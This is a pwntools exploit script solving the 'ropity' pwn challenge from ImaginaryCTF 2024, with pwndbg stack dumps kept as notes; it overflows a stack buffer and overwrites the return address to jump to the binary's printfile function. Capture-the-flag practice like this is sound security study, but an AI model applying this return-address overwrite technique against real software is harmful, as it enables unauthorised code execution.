from pwn import *

exe = ELF('./vuln')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main+38
        continue
    """)
elif args.REMOTE:
    io = remote("addr", 1337)


payload = b''
payload += b'AAAAAAAA'
payload += b'BBBBBBBB' # saved rbp
payload += pack(exe.symbols.printfile) # return addr
io.sendline(payload)
io.interactive()

"""
pwndbg> stack
00:0000│ rsp 0x7ffc195619a8 —▸ 0x40115d (printfile) ◂— endbr64 
01:0008│     0x7ffc195619b0 ◂— 0xa /* '\n' */
02:0010│     0x7ffc195619b8 —▸ 0x401136 (main) ◂— endbr64 
03:0018│     0x7ffc195619c0 ◂— 0x100000000
04:0020│     0x7ffc195619c8 —▸ 0x7ffc19561ab8 —▸ 0x7ffc1956330a ◂— '/workspaces/ctf-writeup/2024/ImaginaryCTF/pwnable/ropity/vuln'
05:0028│     0x7ffc195619d0 ◂— 0x0
06:0030│     0x7ffc195619d8 ◂— 0xf82c1cb2d9e760e4
07:0038│     0x7ffc195619e0 —▸ 0x7ffc19561ab8 —▸ 0x7ffc1956330a ◂— '/workspaces/ctf-writeup/2024/ImaginaryCTF/pwnable/ropity/vuln'
pwndbg> 
08:0040│  0x7ffc195619e8 —▸ 0x401136 (main) ◂— endbr64 
09:0048│  0x7ffc195619f0 —▸ 0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401100 (__do_global_dtors_aux) ◂— endbr64 
0a:0050│  0x7ffc195619f8 —▸ 0x7f918da13040 (_rtld_global) —▸ 0x7f918da142e0 ◂— 0x0
0b:0058│  0x7ffc19561a00 ◂— 0x7d42e1eea8560e4
0c:0060│  0x7ffc19561a08 ◂— 0x70f0648836d60e4
0d:0068│  0x7ffc19561a10 ◂— 0x7f9100000000
0e:0070│  0x7ffc19561a18 ◂— 0x0
0f:0078│  0x7ffc19561a20 ◂— 0x0
pwndbg> 
10:0080│  0x7ffc19561a28 ◂— 0x0
11:0088│  0x7ffc19561a30 ◂— 0x0
12:0090│  0x7ffc19561a38 ◂— 0xc17500b6de157f00
13:0098│  0x7ffc19561a40 ◂— 0x0
14:00a0│  0x7ffc19561a48 —▸ 0x7f918d7d2e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]
15:00a8│  0x7ffc19561a50 —▸ 0x7ffc19561ac8 —▸ 0x7ffc19563348 ◂— 'SHELL=/bin/bash'
16:00b0│  0x7ffc19561a58 —▸ 0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401100 (__do_global_dtors_aux) ◂— endbr64 
17:00b8│  0x7ffc19561a60 —▸ 0x7f918da142e0 ◂— 0x0
pwndbg> 
18:00c0│  0x7ffc19561a68 ◂— 0x0
19:00c8│  0x7ffc19561a70 ◂— 0x0
1a:00d0│  0x7ffc19561a78 —▸ 0x401050 (_start) ◂— endbr64 
1b:00d8│  0x7ffc19561a80 —▸ 0x7ffc19561ab0 ◂— 0x1
1c:00e0│  0x7ffc19561a88 ◂— 0x0
1d:00e8│  0x7ffc19561a90 ◂— 0x0
1e:00f0│  0x7ffc19561a98 —▸ 0x401075 (_start+37) ◂— hlt 
1f:00f8│  0x7ffc19561aa0 —▸ 0x7ffc19561aa8 ◂— 0x1c

pwndbg> p/x 0x7ffc195619a8 + 240
$1 = 0x7ffc19561a98
"""